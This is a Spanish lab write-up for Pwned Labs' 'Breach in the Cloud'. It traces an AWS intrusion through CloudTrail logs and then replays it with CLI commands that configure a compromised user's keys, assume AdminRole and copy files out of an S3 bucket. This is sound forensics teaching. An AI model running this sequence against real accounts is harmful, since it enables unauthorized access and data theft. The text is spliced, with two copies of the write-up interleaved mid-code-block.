---
title: Brecha en la Nube - Pwned Labs
date: 2024-11-26
description: Usando registros de Cloudtrail para detectar actividad maliciosa
isStarred: true
---

## Escenario

Fuimos alertados de un posible incidente de seguridad. El equipo de seguridad de Huge Logistics le ha proporcionado claves de AWS de una cuenta que registró actividad inusual, así como registros de AWS CloudTrail en el momento de la actividad. Necesitamos confirmar la infracción analizando los registros de CloudTrail, identificando el servicio de AWS comprometido y cualquier dato que haya sido filtrado.

## Contexto del mundo real

El análisis de los registros de AWS CloudTrail es una práctica estándar para detectar actividad sospechosa dentro de una cuenta de AWS, mientras que los atacantes suelen atacar los depósitos S3 debido a los datos valiosos que pueden contener.

## Tutorial

### Confirmar la infracción mediante el análisis de los logs de CloudTrail

Para comenzar, descargue los logs de CloudTrail INCIDENT-3252.zip del canal case-files en Pwned Labs Discord.

![image](1.png)
Con el expediente del caso descargado, comencemos la investigación.
Primero descomprima el archivo con unzip.

```
unzip INCIDENT-3252.zip -d INCIDENT-3252
cd INCIDENT-3252
```

Abrir el archivo en un editor de texto como Nano o Vim revela que los archivos JSON no están embellecidos
![image](2.png)
Lo que los hace más difíciles de leer. Para embellecer los archivos podemos usar jq - un procesador JSON de línea de comandos para analizar y estructurar datos. Instálelo si es necesario con el comando apt install jq . Luego ejecute el siguiente comando en el directorio actual que contiene los archivos JSON.

```
for file in *.json; do jq . "$file" > "$file.tmp" && mv "$file.tmp" "$file"; done
```

Al abrir el archivo en nano, los datos ahora son mucho más fáciles de leer y escanear.
![image](3.png)

Veamos qué principals de AWS (Users y Roles de IAM) han estado generando actividad en los registros capturados.

```
grep -r userName | sort -u
```

![image](4.png)

Esto revela un nombre de usuario sospechoso, `temp-user` ,que no coincide con la convención de nomenclatura interna para cuentas creadas. Empecemos por ahí.

![image](5.png)

Notamos que los registros de CloudTrail contienen la hora de creación en el nombre del archivo y están ordenados por hora. El momento más temprano es T2035 así que comencemos por ahí. Sospechamos que la cuenta temp-user está involucrada, y grepeamos el archivo con temp-user como término de búsqueda.

```
grep -h -A 10 temp-user 107513503799_CloudTrail_us-east-1_20230826T2035Z_PjmwM7E4hZ6897Aq.json
```

![image](6.png)

Esto revela que un usuario de IAM llamado `temp-user` con el ARN (Amazon Resource Name) único a nivel mundial `arn:aws:iam::107513503799:user/temp-user` desde la cuenta de AWS `107513503799` emitió el comando CLI aws `sts get-caller-identity` en `2023-08-26T20:29:37Z`.

El comando `GetCallerIdentity` en AWS es parte del Security Token Service (STS) y permite a los usuarios recuperar detalles sobre la identidad de IAM cuyas credenciales se utilizan para realizar la solicitud de API.
Es considerado el whoami para Windows y Linux. El comando devuelve el ARN globalmente único y, si corresponde, el ARN del rol de IAM asumido.
Si bien este es un comando de uso común, también lo utilizan actores malintencionados para determinar el principal (User o Role de IAM) asociado con las credenciales comprometidas, como parte de la obtención de conocimiento de la situación.

La solicitud se originó desde la dirección IP. 84.32.71.19 . Una verificación de la propiedad intelectual revela que la solicitud se originó en Chicago. Esta no es una ciudad donde Huge Logistics tenga presencia técnica, por lo que esto podría ser un posible indicador de compromiso (IoC). Profundicemos más.

```
curl ipinfo.io/84.32.71.19
```

![image](7.png)

Volviendo nuestra atención al siguiente archivo, un vistazo rápido revela que el usuario temp-user hizo un intento fallido de enumerar el contenido de un depósito llamado emergency-data-recovery.

![image](8.png)

```
grep errorMessage 107513503799_CloudTrail_us-east-1_20230826T2050Z_iUtQqYPskB20yZqT.json
```

![image](9.png)

Aunque es muy ruidoso, los actores malintencionados pueden intentar enumerar los permisos otorgados a su usuario o función de IAM mediante fuerza bruta.
Hay varias herramientas disponibles para forzar permisos de IAM, como aws-enumerator y pacu.
Encontramos que hay 450 mensajes de acceso denegado generados por temp-user en el siguiente archivo de registro.

```
grep errorMessage 107513503799_CloudTrail_us-east-1_20230826T2050Z_iUtQqYPskB20yZqT.json | wc -l
grep errorMessage 107513503799_CloudTrail_us-east-1_20230826T2055Z_W0F5uypAbGttUgSn.json | wc -l
```

![image](10.png)

Al analizar el siguiente archivo de registro y buscar nuevamente las acciones invocadas por el usuario, vemos que pudo asumir el rol denominado AdminRole. La operacion AssumeRole en AWS es parte de STS.
Permite que una identidad de AWS asuma un contexto de privilegios diferente durante un período limitado y potencialmente acceda a otros recursos a los que el principal asumido normalmente no tendría acceso.

```
grep -A 20 temp-user 107513503799_CloudTrail_us-east-1_20230826T2100Z_APB7fBUnHmiWjHtg.json
```

![image](11.png)

El examen del siguiente archivo revela que el atacante invocó nuevamente el comando `aws sts get-caller-identity` para verificar su nuevo contexto de ejecución.

```
grep -A 20 AdminRole 107513503799_CloudTrail_us-east-1_20230826T2105Z_fpp78PgremAcrW5c.json
```

![image](12.png)

Tomando nota de su interés anterior en el Bucket S3 emergency-data-recovery, descubrimos que volvieron a intentar enumerar y recuperar el contenido.

```
grep eventName 107513503799_CloudTrail_us-east-1_20230826T2120Z_UCUhsJa0zoFY3ZO0.json
```

![image](13.png)

![image](14.png)

¡Se descargó el archivo emergence.txt!

![image](15.png)

### Volviendo sobre los pasos como atacante

Ahora, pensando como un atacante, queremos validar la ruta de explotación y acceder a los datos comprometidos. Emitimos el comando `aws configure` para configurar las claves de AWS proporcionadas en la parte superior del laboratorio para el usuario que creemos que está comprometido.
A continuación confirmamos nuestro contexto de ejecución.

```
❯ aws configure --profile pwned
AWS Access Key ID [None]: AKIARSCCN4A3WDXXXXXX
AWS Secret Access Key [None]: Wv7hFnshIshgrDKFvlrclgImQNr0az/XgzXXXXXX
Default region name [None]:
Default output format [None]:
```

```
❯ aws sts get-caller-identity --profile pwned
{
    "UserId": "AIDARSCCN4A3X2YXXXXXX",
    "Account": "107513503799",
    "Arn": "arn:aws:iam::107513503799:user/temp-user"
}
```

Veamos si tenemos políticas de usuario en línea adjuntas a nuestro usuario de IAM.

```
❯ aws iam list-user-policies --user-name temp-user --profile pwned
{
    "PolicyNames": [
        "test-temp-user"
    ]
}
```

Esto revela la política denominada test-temp-user. Comprobémoslo.

```
❯ aws iam get-user-policy --user-name temp-user --policy-name test-temp-user --profile pwned
{
    "UserName": "temp-user",
    "PolicyName": "test-temp-user",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "VisualEditor0",
                "Effect": "Allow",
                "Action": "sts:AssumeRole",
                "Resource": "arn:aws:iam::107513503799:role/AdminRole"
            }
        ]
    }
}
```

Esto revela que el usuario puede asumir el rol denominado AdminRole.
Una vez identificado el Role, el atacante intentó asumirlo. Podemos hacer esto con el siguiente comando.

```
❯ aws sts assume-role --role-arn arn:aws:iam::107513503799:role/AdminRole --role-session-name MySession --profile pwned
{
    "Credentials": {
        "AccessKeyId": "ASIARSCCN4A3RCXXXXXX",
        "SecretAccessKey": "C2kcfmWYkMFPhKkxyyrWo5x75ceX/HWitSXXXXXX",
        "SessionToken": "FwoGZXIvYXdzEP///////////XXXXXXXXXXXXXXXXXXXXXXXXRzYnFhLhpZQoPTL21i8MGKsp13LObaMaRjIOQt6WtBgdYmZG8nuiKxMxOZxwmuRzZs/vAQPBEWJDk3KWcP1u6kul3ySzatir+2sh6UTVr4d8qqOUqgvrNBHNH6/x2w1O7ZznvHgOKsVbjjnQaxpFVeNwWQeVV9odqUObWD/kdc1WSBRUd0HP6gIq2R0RgMo26gqbtkMzI+XcHJzqiv9SnhhtKP3rlLgGMi1cAcfnepFQGgeRIJVe8QYM78eGTTLEDf+W4/6jua6lfxbDfBHOVkQWlcH0rTo=",
        "Expiration": "2024-10-08T14:39:09+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARSCCN4A34V23XHK6I:MySession",
        "Arn": "arn:aws:sts::107513503799:assumed-role/AdminRole/MySession"
    }
}
```

Para asumir el papel, necesitamos emitir el comando `aws configure` para utilizar el AccessKeyId y SecretAccessKey proporcionada en el paso anterior.
Luego emita el comando aws configure set aws_session_token `<SessionToken>` para configurar el token.
Una vez hecho esto podemos llamar al comando aws sts get-caller-identity ¡Y verifica nuestro nuevo contexto!

```
❯ aws sts get-caller-identity --profile pwned2
{
    "UserId": "AROARSCCN4A34V23XHK6I:MySession",
    "Account": "107513503799",
    "Arn": "arn:aws:sts::107513503799:assumed-role/AdminRole/MySession"
}
```

Ahora podemos enumerar el contenido del BUcketS3 y recuperar los archivos

```
aws s3 ls s3://emergency-data-recovery --profile pwned2
```

![image](16.png)

```
❯ aws s3 cp s3://emergency-data-recovery/emergency.txt . --profile pwned2
aws s3 cp s3://emergency-data-recovery/message.txt . --profile pwned2
download: s3://emergency-data-recovery/emergency.txt to ./emergency.txt---
title: Brecha en la Nube - Pwned Labs
date: 2024-11-26
description: Usando registros de Cloudtrail para detectar actividad maliciosa
tags: AWS
---

## Escenario

Hemos sido alertados de un posible incidente de seguridad. El equipo de seguridad de Huge Logistics le ha proporcionado claves de AWS de una cuenta que registró actividad inusual, así como registros de AWS CloudTrail en el momento de la actividad. Necesitamos su experiencia para confirmar la infracción analizando nuestros registros de CloudTrail, identificando el servicio de AWS comprometido y cualquier dato que haya sido filtrado.

## Contexto del mundo real

El análisis de los registros de AWS CloudTrail es una práctica estándar para detectar actividad sospechosa dentro de una cuenta de AWS, mientras que los atacantes suelen atacar los depósitos S3 debido a los datos valiosos que pueden contener.

## Tutorial

### Confirmación de la infracción mediante el análisis de los registros de CloudTrail

Para comenzar, descargue los registros de CloudTrail INCIDENT-3252.zip del canal case-files en Pwned Labs Discord.

![image](1.png)
Con el expediente del caso descargado, comencemos la investigación.
Primero descomprima el archivo con unzip. Si necesita instalarlo primero, ejecute:

```
sudo apt install unzip
unzip INCIDENT-3252.zip -d INCIDENT-3252
cd INCIDENT-3252
```

Abrir el archivo en un editor de texto como Nano o Vim revela que los archivos JSON no están embellecidos
![image](2.png)
Lo que los hace más difíciles de leer. Para embellecer los archivos podemos usar jq - un procesador JSON de línea de comandos para analizar y estructurar datos. Instálelo si es necesario con el comando apt install jq . Luego ejecute el siguiente comando en el directorio actual que contiene los archivos JSON.

```
for file in *.json; do jq . "$file" > "$file.tmp" && mv "$file.tmp" "$file"; done
```

Al abrir el archivo en nano, los datos ahora son mucho más fáciles de leer y escanear.
![image](3.png)

Veamos qué principals de AWS (Users y Roles de IAM) han estado generando actividad en los registros capturados.

```
grep -r userName | sort -u
```

![image](4.png)

Esto revela el nombre de usuario sospechoso. `temp-user` que no coincide con la convención de nomenclatura interna para cuentas creadas. Empecemos por ahí.

![image](5.png)

Notamos que los registros de CloudTrail contienen la hora de creación en el nombre del archivo y están ordenados por hora. El momento más temprano es T2035 así que comencemos por ahí. Sospechamos que la cuenta temp-user está involucrada, y grepeamos el archivo con temp-user como término de búsqueda.

```
grep -h -A 10 temp-user 107513503799_CloudTrail_us-east-1_20230826T2035Z_PjmwM7E4hZ6897Aq.json
```

![image](6.png)

Esto revela que un usuario de IAM llamado `temp-use` con el ARN (Amazon Resource Name) único a nivel mundial `arn:aws:iam::107513503799:user/temp-user` desde la cuenta de AWS `107513503799` emitió el comando CLI aws s`ts get-caller-identity` en `2023-08-26T20:29:37Z`.

El comando `GetCallerIdentity` en AWS es parte del Security Token Service (STS) y permite a los usuarios recuperar detalles sobre la identidad de IAM cuyas credenciales se utilizan para realizar la solicitud de API.
Se puede considerar un poco el whoami comando para Windows y Linux. El comando devuelve el ARN globalmente único y, si corresponde, el ARN del rol de IAM asumido.
Si bien este es un comando de uso común, también lo utilizan actores malintencionados para determinar el principal (User o Role de IAM) asociado con las credenciales comprometidas, como parte de la obtención de conocimiento de la situación.

La solicitud se originó desde la dirección IP. 84.32.71.19 . Una verificación de la propiedad intelectual revela que la solicitud se originó en Chicago. Esta no es una ciudad donde Huge Logistics tenga presencia técnica, por lo que esto podría ser un posible indicador de compromiso (IoC). Profundicemos más.

```
curl ipinfo.io/84.32.71.19
```

![image](7.png)

Volviendo nuestra atención al siguiente archivo, un vistazo rápido revela que el usuario temp-user hizo un intento fallido de enumerar el contenido de un depósito llamado emergency-data-recovery.

![image](8.png)

```
grep errorMessage 107513503799_CloudTrail_us-east-1_20230826T2050Z_iUtQqYPskB20yZqT.json
```

![image](9.png)

Aunque es muy ruidoso, los actores malintencionados pueden intentar enumerar los permisos otorgados a su usuario o función de IAM mediante fuerza bruta.
Hay varias herramientas disponibles para forzar permisos de IAM, como aws-enumerator y pacu.
Encontramos que hay 450 mensajes de acceso denegado generados por temp-user en el siguiente archivo de registro.

```
grep errorMessage 107513503799_CloudTrail_us-east-1_20230826T2050Z_iUtQqYPskB20yZqT.json | wc -l
grep errorMessage 107513503799_CloudTrail_us-east-1_20230826T2055Z_W0F5uypAbGttUgSn.json | wc -l
```

![image](10.png)

Al analizar el siguiente archivo de registro y buscar nuevamente las acciones invocadas por el usuario, vemos que pudo asumir el rol denominado AdminRole. La operacion AssumeRole en AWS es parte de STS.
Permite que una identidad de AWS asuma un contexto de privilegios diferente durante un período limitado y potencialmente acceda a otros recursos a los que el principal asumido normalmente no tendría acceso.

```
grep -A 20 temp-user 107513503799_CloudTrail_us-east-1_20230826T2100Z_APB7fBUnHmiWjHtg.json
```

![image](11.png)

El examen del siguiente archivo revela que el atacante invocó nuevamente el comando `aws sts get-caller-identity` para verificar su nuevo contexto de ejecución.

```
grep -A 20 AdminRole 107513503799_CloudTrail_us-east-1_20230826T2105Z_fpp78PgremAcrW5c.json
```

![image](12.png)

Tomando nota de su interés anterior en el Bucket S3 emergency-data-recovery, descubrimos que volvieron a intentar enumerar y recuperar el contenido.

```
grep eventName 107513503799_CloudTrail_us-east-1_20230826T2120Z_UCUhsJa0zoFY3ZO0.json
```

![image](13.png)

![image](14.png)

¡Se descargó el archivo emergence.txt!

![image](15.png)

### Volviendo sobre los pasos como atacante

Ahora, pensando como un atacante, queremos validar la ruta de explotación y acceder a los datos comprometidos. Emitimos el comando `aws configure` para configurar las claves de AWS proporcionadas en la parte superior del laboratorio para el usuario que creemos que está comprometido.
A continuación confirmamos nuestro contexto de ejecución.

```
❯ aws configure --profile pwned
AWS Access Key ID [None]: AKIARSCCN4A3WDXXXXXX
AWS Secret Access Key [None]: Wv7hFnshIshgrDKFvlrclgImQNr0az/XgzXXXXXX
Default region name [None]:
Default output format [None]:
```

```
❯ aws sts get-caller-identity --profile pwned
{
    "UserId": "AIDARSCCN4A3X2YXXXXXX",
    "Account": "107513503799",
    "Arn": "arn:aws:iam::107513503799:user/temp-user"
}
```

Veamos si tenemos políticas de usuario en línea adjuntas a nuestro usuario de IAM.

```
❯ aws iam list-user-policies --user-name temp-user --profile pwned
{
    "PolicyNames": [
        "test-temp-user"
    ]
}
```

Esto revela la política denominada test-temp-user. Comprobémoslo.

```
❯ aws iam get-user-policy --user-name temp-user --policy-name test-temp-user --profile pwned
{
    "UserName": "temp-user",
    "PolicyName": "test-temp-user",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "VisualEditor0",
                "Effect": "Allow",
                "Action": "sts:AssumeRole",
                "Resource": "arn:aws:iam::107513503799:role/AdminRole"
            }
        ]
    }
}
```

Esto revela que el usuario puede asumir el rol denominado AdminRole.
Una vez identificado el Role, el atacante intentó asumirlo. Podemos hacer esto con el siguiente comando.

```
❯ aws sts assume-role --role-arn arn:aws:iam::107513503799:role/AdminRole --role-session-name MySession --profile pwned
{
    "Credentials": {
        "AccessKeyId": "ASIARSCCN4A3RCXXXXXX",
        "SecretAccessKey": "C2kcfmWYkMFPhKkxyyrWo5x75ceX/HWitSXXXXXX",
        "SessionToken": "FwoGZXIvYXdzEP///////////XXXXXXXXXXXXXXXXXXXXXXXXRzYnFhLhpZQoPTL21i8MGKsp13LObaMaRjIOQt6WtBgdYmZG8nuiKxMxOZxwmuRzZs/vAQPBEWJDk3KWcP1u6kul3ySzatir+2sh6UTVr4d8qqOUqgvrNBHNH6/x2w1O7ZznvHgOKsVbjjnQaxpFVeNwWQeVV9odqUObWD/kdc1WSBRUd0HP6gIq2R0RgMo26gqbtkMzI+XcHJzqiv9SnhhtKP3rlLgGMi1cAcfnepFQGgeRIJVe8QYM78eGTTLEDf+W4/6jua6lfxbDfBHOVkQWlcH0rTo=",
        "Expiration": "2024-10-08T14:39:09+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARSCCN4A34V23XHK6I:MySession",
        "Arn": "arn:aws:sts::107513503799:assumed-role/AdminRole/MySession"
    }
}
```

Para asumir el papel, necesitamos emitir el comando `aws configure` para utilizar el AccessKeyId y SecretAccessKey proporcionada en el paso anterior.
Luego emita el comando aws configure set aws_session_token `<SessionToken>` para configurar el token.
Una vez hecho esto podemos llamar al comando aws sts get-caller-identity ¡Y verifica nuestro nuevo contexto!

```
❯ aws sts get-caller-identity --profile pwned2
{
    "UserId": "AROARSCCN4A34V23XHK6I:MySession",
    "Account": "107513503799",
    "Arn": "arn:aws:sts::107513503799:assumed-role/AdminRole/MySession"
}
```

Ahora podemos enumerar el contenido del BUcketS3 y recuperar los archivos

```
aws s3 ls s3://emergency-data-recovery --profile pwned2
```

![image](16.png)

```
❯ aws s3 cp s3://emergency-data-recovery/emergency.txt . --profile pwned2
aws s3 cp s3://emergency-data-recovery/message.txt . --profile pwned2
download: s3://emergency-data-recovery/emergency.txt to ./emergency.txt
download: s3://emergency-data-recovery/message.txt to ./message.txt
```

## Referencias

- [Laboratorio en Pwed Labs](https://pwnedlabs.io/labs/breach-in-the-cloud)
- [Link 1](https://vikas-singh.notion.site/AWS-CloudTrail-Forensics-A-SIEM-Case-Study-c88ea9f7a66e4d038500dcfe28e5e53d)
- [Link 2](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-log-file-examples.html)
- [Link 3](https://github.com/nagwww/s3-leaks)
download: s3://emergency-data-recovery/message.txt to ./message.txt
```

## Referencias

- [Laboratorio en Pwed Labs](https://pwnedlabs.io/labs/breach-in-the-cloud)
- [Link 1](https://vikas-singh.notion.site/AWS-CloudTrail-Forensics-A-SIEM-Case-Study-c88ea9f7a66e4d038500dcfe28e5e53d)
- [Link 2](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-log-file-examples.html)
- [Link 3](https://github.com/nagwww/s3-leaks)